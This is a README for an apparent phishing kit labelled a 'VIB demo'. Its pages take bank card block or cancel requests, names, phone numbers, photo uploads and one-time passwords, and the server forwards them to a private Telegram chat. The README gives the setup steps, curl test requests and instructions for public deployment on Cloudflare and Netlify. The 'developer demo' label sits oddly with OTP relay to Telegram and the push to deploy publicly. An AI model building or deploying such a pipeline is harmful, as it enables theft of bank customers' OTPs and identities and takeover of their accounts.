# VIB Demo: Relay card block requests + OTP to Telegram

This repository contains small frontend pages and a demo Express server that accepts card block/hủy requests and OTPs, and forwards them to a Telegram bot chat. It's intended as a developer demo; do NOT use in production without proper security reviews.

Quick start

1. Copy `.env.example` to `.env` and fill in values:

```powershell
cp .env.example .env
# then edit .env to add your TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
```

2. Install dependencies and run server

```powershell
npm install
npm run start
```

3. The server will listen on the port from `.env` (default `3000`).

Endpoints

- `POST /api/request-block` — accepts form fields and optional file uploads (multipart/form-data). Returns `{ status: 'ok', requestId, maskedPhone }`.
- `POST /api/verify-otp` — accepts JSON `{ requestId, otp }` and returns `{ status: 'verified' }` on success.

Security & notes

- This server stores request data in-memory (Map) for demo only.
- The Telegram bot token is required and must be kept secret. Do not commit it to git.
- For production, validate inputs, store files securely, rate-limit, and use proper authentication.

## Telegram bot setup (dev)

You can configure the Telegram bot token and chat id either via `.env` or at runtime using dev-only endpoints.

1. Environment variables (preferred for persistence):

```
TELEGRAM_BOT_TOKEN=123456:ABC...your-bot-token
TELEGRAM_CHAT_ID=123456789
PORT=4000
HOST=127.0.0.1
```

2. Runtime configuration (not persisted; dev-only):

- Check current status (masked token):

```
curl http://127.0.0.1:4000/api/telegram/status
```

- Set token and chat id (and verify with getMe):

```
curl -H "Content-Type: application/json" \
	--data '{"token":"123456:ABC...","chatId":"123456789","verify":true}' \
	http://127.0.0.1:4000/api/telegram/config
```

- Test sending a message:

```
curl -H "Content-Type: application/json" \
	--data '{"text":"Hello from local server"}' \
	http://127.0.0.1:4000/api/telegram/test
```

Notes:

- These endpoints are disabled when `NODE_ENV=production`.
- The server uses the in-memory config set by `.env` or `/api/telegram/config` for all Telegram notifications.

---

## Cloudflare migration quickstart

This repository can be migrated to Cloudflare using Cloudflare Pages for static `public/` and a Cloudflare Worker for API endpoints.

1. Install Wrangler (Cloudflare CLI)

```bash
npm install -g wrangler
```

2. Configure `wrangler.toml` (fill `account_id`) and set secrets:

```bash
wrangler login
wrangler secret put TELEGRAM_BOT_TOKEN
wrangler secret put TELEGRAM_CHAT_ID
```

3. Test Worker locally

```bash
wrangler dev cloudflare/worker/index.js
```

4. Publish Worker

```bash
wrangler publish cloudflare/worker/index.js
```

5. Deploy static site to Pages: create Pages project and point publish directory to `public/`.

Notes: to persist file uploads consider Cloudflare R2; update worker to write image bytes to R2 and return public URLs.

## Additional: example requests to the Worker

After you've published the Worker (or while running `wrangler dev`) you can test the `/api/field-update` endpoint.

1. Text-only example (no image):

```bash
curl -X POST 'https://<YOUR_WORKER_OR_DEV_URL>/api/field-update' \
	-H 'Content-Type: application/json' \
	-d '{"sessionId":"test-123","fullName":"Nguyen Van A","phone":"0900000000","page":1}'
```

2. Small image example (data URL). This uses a tiny 1x1 PNG base64 string so it's safe to paste in a terminal. Replace `<DATA_URL>` with the value shown below.

Tiny PNG data URL (1x1 transparent):

```
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgQG8sZ4AAAAASUVORK5CYII=
```

Example curl posting that tiny image in the `images` array:

```bash
curl -X POST 'https://<YOUR_WORKER_OR_DEV_URL>/api/field-update' \
	-H 'Content-Type: application/json' \
	-d '{"sessionId":"test-123","fullName":"Nguyen Van A","phone":"0900000000","images":["data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgQG8sZ4AAAAASUVORK5CYII="]}'
```

Make sure you have set the required Wrangler secrets before publishing or running `wrangler dev`:

```bash
wrangler login
wrangler secret put TELEGRAM_BOT_TOKEN
wrangler secret put TELEGRAM_CHAT_ID
```

If `wrangler publish` exits with errors, check the `wrangler` logs and ensure your `wrangler.toml` has the correct `account_id` and that the project path is correct.

---

## Netlify deployment quickstart

If you'd prefer to deploy the frontend + API on Netlify (Pages + Functions), this repo includes a Netlify Function and `netlify.toml` to help:

Files added for Netlify:

- `netlify/functions/field-update.js` — serverless function handling `POST /api/field-update` and sending messages/photos to Telegram.
- `netlify.toml` — config with `publish = "public"` and functions dir.

Steps to deploy to Netlify:

1. Create a Netlify account and connect your GitHub repository (New site from Git).
2. In the Netlify UI, set the publish directory to `public` (build command leave empty if static).
3. Under Site settings -> Build & deploy -> Environment, add the following environment variables:
   - `TELEGRAM_BOT_TOKEN` (your bot token)
   - `TELEGRAM_CHAT_ID` (numeric chat id or `@channelusername`)
4. Deploy the site. Netlify will expose the function at `/.netlify/functions/field-update`, and the repo's `netlify.toml` redirects `/api/*` to the function, so you can call `/api/field-update`.

Test after deploy:

```bash
curl -X POST "https://<your-netlify-site>.netlify.app/api/field-update" \
	-H "Content-Type: application/json" \
	-d '{"sessionId":"test","fullName":"Nguyen","phone":"0900000000"}'
```

Notes & caveats:

- Netlify Functions have request body size limits; avoid very large base64 images. For larger files use a storage service (S3/R2) and send URLs.
- Keep bot tokens secret; store them in Netlify environment variables, not in the repo.
- If you need WebSockets, long-running jobs, or larger compute, consider a dedicated server or Cloudflare Workers with R2.
